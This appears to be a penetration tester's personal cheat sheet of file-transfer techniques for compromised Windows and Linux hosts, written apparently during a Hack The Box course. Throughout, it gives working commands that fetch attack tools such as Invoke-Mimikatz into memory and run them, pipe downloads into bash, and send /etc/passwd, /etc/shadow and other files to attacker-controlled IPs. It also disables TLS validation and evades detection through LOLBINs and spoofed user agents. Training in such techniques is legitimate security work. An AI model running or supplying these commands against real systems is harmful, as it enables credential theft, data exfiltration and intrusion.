## Windows File Transfer Methods

```
$ md5sum id_rsa
```
%% use md5 to ensure the file for transfer you encode and decode is correct %%

```
$ cat id_rsa |base64 -w 0;echo
```
%% encode SSH key to base64 %%

```
PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<base64 encode string>"))
```
%% copy this content and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it. %%

```
PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```
%% confirm MD5 hashes match %%

### PowerShell DownloadFile Method
```
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```
%% We can specify the class name Net.WebClient and the method DownloadFile with the parameters corresponding to the URL of the target file to download and the output file name. %%

### PowerShell DownloadString - Fileless Method
```
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```
%% Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression cmdlet or the alias IEX. %%

```
PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```
%% same method but with IEX pipeline %%

### PowerShell Invoke-WebRequest
```
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```
%% slower method to download but can still be used %%

```
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```
%% There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. use basic parsing to bypass this %%

```
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

```
%% bypass ssl certificate not trusted errors %%

### SMB Downloads
```
$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```
%% create smb server to download from in our attack machine  make sure to make it authenticated as most modern versions of windows block guest access%%

```
C:\htb> copy \\192.168.220.133\share\nc.exe
```
%% copy file from smb server %%

```
C:\htb> net use n: \\192.168.220.133\share /user:test test
```
%% if using username/password %%

### FTP Downloads
```
$ sudo pip3 install pyftpdlib
$ sudo python3 -m pyftpdlib --port 21
```
%% start ftp server on attack machine %%

```
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```
%% transfer file fomr an FTP server using PowerShell %%

### Upload Operations
### PowerShell Base64 Encode & Decode
```
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))<base64 encode output>
PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```
%% encode for upload to attack machine %%

```
$ echo <<base64 encode output> | base64 -d > hosts
$ md5sum hosts 
```
%% copy to file in linux machine  and use md5sum to confirm same as original%%

### PowerShell Web Uploads
```
$ pip3 install uploadserver
$ python3 -m uploadserver
```
%% start upload server on attacker machine %%

```
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```
%% use powershell script PSUpload.ps1 to upload to uploadserver on attack machine %%

### Powershell Base64 Web Upload
```
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```
%%  use iex base64 to upload to netcat listener on attacker machine %%

### SMB Uploads
```
$ sudo pip3 install wsgidav cheroot
$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```
%% smb server on attack host %%

```
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```
%% copy to attack host DavWWWRoot refers to root of smb server but you can specify different folder %%

### FTP Uploads
```
$ sudo python3 -m pyftpdlib --port 21 --write
```
%% start ftp server %%

```
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```
%% powershell upload file to FTP Server %%


## Linux File Transfer Methods
```
$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```
%% use wget to download file onto target machine -O is for output filename %%

```
$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```
%% same as above %%

```
$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```
%% fileless download with wget and curl meaning it executes instead of storing file on disk %%

### SSH Downloads
```
$ sudo systemctl enable ssh
$ sudo systemctl start ssh
$ netstat -lnpt
```
%% use SCP to copy files between hosts securely, start this by enabling and starting SSH listener to copy paste files between hosts %%

```
$ scp plaintext@192.168.49.128:/root/myroot.txt .
```
%% use scp, it is like copy with only difference being you use your credentials and provide remote IP address or DNS name %%

### Web Upload
```
$ sudo python3 -m pip install --user uploadserver
$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
$ mkdir https && cd https
$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
%% whole process for uploading files %%

### SCP Upload
```
$ scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

## Transferring files with code
```
$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
%% transfer files with code natively if python is installed %%

```
$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
]$ php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```
%%  PHP download and put contents into a file and fopen() module to open a   URL, read it's content and save it into a file.%%

```
$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```
%% download a file and pipe it to bash %%

```
$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```
%% perl and ruby languages to download a file %%

### VBScript
```
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```
%% create a file wget.vbs with above code %%

```
C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```
%% open command prompt and enter URL of file you want to download %%

### Upload operations
```
$ python3 -m uploadserver
```
%% start python uploadserver on attack host %%

```
$ $ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```
%% upload files with above one-liner %%

## Miscellaneous File Transfer Methods
```
$ nc -l -p 8000  --recv-only > <file you want to download>
```
%% listen on victim machine  --recv-only to close connection once file is transferred%%

```
$ ncat --send-only 192.168.49.128 8000 < <file to send to compromised host>
```
%% --send-only flag to send the file to victim host  to terminate connection once file is transferred %%

```
$ sudo nc -l -p 443 -q 0 < <file to transfer to victim host>
```
%% if inbound connection to victim machine is blocked start listener on attack host %%

```
$ nc 192.168.49.128 443 > <file to download from attack host>
```
%% connect to attack host and download file  you can use --send-only and --recv-only options from before%%

```
$ cat < /dev/tcp/192.168.49.128/443 > <file to download from attack host>
```
%% if netcat is not installed use /dev/tcp to download file from attack host %%

### PowerShell Session File Transfer

```
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```
%% assuming you have access to DC01 and want to transfer file to DATABASE01, you can create a session to the host then copy files from DC01 to DATABASE01 %%

```
$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```
%% if copy paste does not work as expected when using xfreerdp to rdp to a windows host, you can  mount a linux folder using rdesktop on attack host %%

```
$ xfreerdp3 /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```
%% alternatively you can mount it using xfreerdp  to access the diretory we can connect to \\tsclient\ or use mstsc.exe from windows host%%

```
PS C:\htb> Import-Module .\Invoke-AESEncryption.ps1
PS C:\htb> Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
```
%% if you need to transfer sensitive info and HTTPS, or other secure methods of transfer are not available then you can encrypt your data before sending it %%

```
$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
```
%% encrypt data using openssl %%

```
$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```
%% decrypt data using openssl %%

## Living off The Land
```
C:\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
```
%% use LOLBINS certreq.exe to transfer a file to our attack host %%

Go to [https://lolbas-project.github.io/ ]()for searching windows living off the land binaries (LOLBAS)

Go to [https://gtfobins.org/]() for searching Linux binaries

### OpenSSL to transfer files

```
$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```
%% create certificate in attack machine %%

```
$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```
%% stand up server in our attack machine %%

```
$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```
%% download file onto compromised machine %%

### Other LOLBINS for transferring files
```
PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```
%% use bitsadmin LOLBINS to transfer nc.exe from out attack host %%

```
PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```
%% use bitstransfer to transfer files from attack host to  compromised host %%

```
C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```
%% use certutil but keep in mind it may be blocked by AV %%

## Evading Detection when transferring files
### Changing user agents
```
PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```
%% download file while spoofing user agent to evade detection %%

```
PS C:\htb> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```
%% if application whitelisting has been implemented as a security control use  GfxDownloadWrapper.exe which is used by intel graphic driver or search for other LOLBIN "file download" binary in the lolbins link shared earlier %%